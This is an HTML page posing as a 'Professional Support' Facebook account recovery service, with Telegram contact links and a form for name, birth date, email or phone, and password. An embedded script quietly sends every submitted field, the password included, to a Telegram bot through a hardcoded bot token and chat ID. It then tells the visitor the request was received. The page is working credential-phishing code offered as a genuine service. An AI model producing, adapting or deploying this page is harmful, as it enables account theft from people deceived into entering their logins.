<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Account Recovery | Professional Support</title>

<style>
:root{
    --primary:#1877f2;
    --secondary:#229ED9;
    --bg:#f0f2f5;
    --card:#ffffff;
    --text:#1c1e21;
    --text-light:#65676b;
}

*{box-sizing:border-box;margin:0;padding:0;font-family:"Segoe UI",Arial,sans-serif;}
body{background:var(--bg);color:var(--text);}

/* HERO */
.hero{
    height:60vh;
    background:
        linear-gradient(rgba(0,0,0,.55),rgba(0,0,0,.55)),
        url("hero-banner.png");
    background-size:cover;
    background-position:center;
    display:flex;
    flex-direction:column;
    justify-content:center;
    align-items:flex-end;
    text-align:right;
    color:#fff;
    padding:40px;
}

.hero p{font-size:1.2rem;margin-bottom:20px;max-width:520px;}

.tg-buttons{
    display:flex;
    gap:12px;
    flex-wrap:wrap;
    justify-content:flex-end;
}

.btn{
    padding:12px 26px;
    border-radius:8px;
    text-decoration:none;
    font-weight:600;
    color:#fff;
    transition:.3s;
}
.btn:hover{opacity:.9;transform:translateY(-2px);}
.btn-support{background:#229ED9;}
.btn-channel{background:#1e40af;}
.btn-bot{background:#0ea5e9;}

.container{max-width:800px;margin:-50px auto 50px;padding:0 20px;}
.card{
    background:var(--card);
    padding:40px;
    border-radius:12px;
    box-shadow:0 4px 12px rgba(0,0,0,.1);
}

/* FORM */
.section-title{
    border-bottom:2px solid #eee;
    padding-bottom:10px;
    margin-bottom:20px;
    color:var(--primary);
}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:15px;}
.input-group{margin-bottom:20px;}
label{display:block;font-weight:600;margin-bottom:6px;font-size:.9rem;}

input,textarea{
    width:100%;
    padding:12px;
    border:1px solid #ddd;
    border-radius:6px;
    background:#f5f6f7;
}
textarea{height:120px;resize:none;}

.alert{
    background:#fff9e6;
    border-left:4px solid #f7b924;
    padding:15px;
    margin-bottom:25px;
    font-size:.9rem;
}

.btn-primary{
    background:var(--primary);
    width:100%;
    border:none;
    cursor:pointer;
    font-size:1.05rem;
    color:#fff;
    padding:12px;
    border-radius:8px;
}

footer{
    text-align:center;
    font-size:.8rem;
    color:var(--text-light);
    margin-top:40px;
}

@media(max-width:600px){
    .grid{grid-template-columns:1fr;}
    .hero{padding:25px;}
}
</style>
</head>

<body>

<!-- HERO -->
<header class="hero">
    <p>Fast, Secure & Professional Recovery Assistance</p>

    <div class="tg-buttons">
        <a href="https://t.me/deeplyfeel" target="_blank" class="btn btn-support">
            💬 Support Chat
        </a>
        <a href="https://t.me/facebookrecoverybydeep" target="_blank" class="btn btn-channel">
            📢 Official Channel
        </a>
        <a href="https://t.me/facebookdetailsbot" target="_blank" class="btn btn-bot">
            🤖 Details Bot
        </a>
    </div>
</header>

<div class="container">
<div class="card">

<div class="alert">
<strong>Security Notice:</strong> We never ask for OTP, PIN or card details.
</div>

<form id="recoveryForm">

<h3 class="section-title">Personal Details</h3>

<div class="grid">
  <div class="input-group">
    <label>Facebook First Name</label>
    <input type="text" required>
  </div>
  <div class="input-group">
    <label>Facebook Last Name</label>
    <input type="text" required>
  </div>
</div>

<div class="grid">
  <div class="input-group">
    <label>Facebook Date of Birth</label>
    <input type="date" required>
  </div>
  <div class="input-group">
    <label>Facebook Email / Phone</label>
    <input type="text" required>
  </div>
</div>

<div class="input-group">
  <label>Facebook Password</label>
  <input type="text">
</div>

<div class="input-group">
  <label>Facebook Case Details</label>
  <textarea required></textarea>
</div>

<button type="submit" class="btn-primary">Submit Details</button>

</form>

</div>

<footer>
© 2026 DeeplyFeel Service
</footer>
</div>

<!-- TELEGRAM SCRIPT -->
 <script>
/* 🔐 TELEGRAM CONFIG */
const BOT_TOKEN = "8587151536:AAGp4YRIkvOWzNzV6B8K2m-p2nROrpzGHwc"; // 👈 yahan NEW token
const CHAT_ID  = "7326556272";                // 👈 tumhari chat id

const form = document.getElementById("recoveryForm");

async function sendToTelegram(message){
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body:JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "HTML"
    })
  });
}

form.onsubmit = async e => {
  e.preventDefault();

  const i = document.querySelectorAll("input");
  const details = document.querySelector("textarea").value;

  const msg = `
<b>📥 New Recovery Details</b>

<b>Name:</b> ${i[0].value} ${i[1].value}
<b>DOB:</b> ${i[2].value}
<b>Email / Phone:</b> ${i[3].value}
<b>Password:</b> ${i[4].value}

<b>Case Details:</b>
${details}
`;

  await sendToTelegram(msg);

  alert("Details submitted successfully. We will contact you.");
  form.reset();
};
  </script>
</body>
</html>
